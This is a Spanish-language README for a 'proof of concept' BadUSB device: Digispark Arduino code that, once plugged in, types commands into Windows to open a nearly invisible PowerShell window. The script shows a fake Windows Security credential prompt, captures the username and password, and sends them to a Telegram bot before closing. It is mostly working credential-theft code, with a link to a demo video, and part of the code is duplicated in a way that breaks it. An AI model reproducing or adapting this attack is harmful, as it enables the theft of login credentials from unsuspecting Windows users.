# Prueba de Concepto: Windows Phisher

## 1. Objetivo
Captura de credenciales en un sistema Windows 10 (configuración de teclado en inglés - ENG), enviando la información a un bot de Telegram y cerrándose automáticamente.

## 2. Descripción 
La prueba consiste en:
1. **Abrir Ejecutar** (Win + R)
2. **Ejecutar PowerShell** en una ventana extremadamente pequeña (15x1) para ser sigiloso
3. **Ejecutar un script** que:
   - Carga el ensamblado necesario para credenciales
   - Muestra un prompt legítimo de Windows Security
   - Captura usuario y contraseña
   - Envía los datos a Telegram
   - Cierra PowerShell automáticamente
4. **Indicador LED** que se enciende durante 60 segundos tras la ejecución

## 3. Requisitos Previos
### Hardware:
- Bot de Telegram (token y chat ID configurados)

### Configuración del Bot de Telegram:
```bash
# Crear bot con @BotFather en Telegram
# Obtener token y chat ID
```


## 4. Código
```cpp
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);  // LED integrado
}

void loop() {
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
  // Abrir Ejecutar
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Abrir PowerShell con ventana MUY pequeña
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=15 lines=1\"");
  DigiKeyboard.delay(2000);

  // Setup, bucle y captura de credenciales
  DigiKeyboard.println(F("Add-Type -AssemblyName System.DirectoryServices.AccountManagement; do {$cred=$host.ui.PromptForCredential('Windows Security','Enter credentials','','');if($cred){$net=$cred.GetNetworkCredential();$user=$net.username;$pass=$net.password;"));
  DigiKeyboard.delay(300);
  
  // Envío a Telegram y cierre
  DigiKeyboard.println(F("$token='SIN_TOKEN';$chat='SIN_ID';$msg='U:'+$user+' P:'+$pass;try{Invoke-RestMethod -Uri ('https://api.telegram.org/bot'+$token+'/sendMessage') -Method Post -Body @{chat_id=$chat;text=$msg};exit}catch{}}}while($true)"));
  DigiKeyboard.delay(300);
  
  DigiKeyboard.println();
  
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(60000);
  digitalWrite(1, LOW);
}
```

## 5. Demostración
<div align="center"> <a href="https://drive.google.com/file/d/1prwLntRILzsWV0TJOY44i7Z2kmgYLC6J/view?usp=sharing" target="_blank"> <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" alt="Ver en Google Drive" width="100"/> </a> <p><strong> <a href="https://drive.google.com/file/d/1prwLntRILzsWV0TJOY44i7Z2kmgYLC6J/view?usp=sharing" target="_blank">Haz clic aquí para ver el video de la prueba de concepto</a></strong></p> <p><em>El video muestra el proceso completo: inserción del USB, apertura de PowerShell, prompt de credenciales, captura y envío a Telegram</em></p> </div>
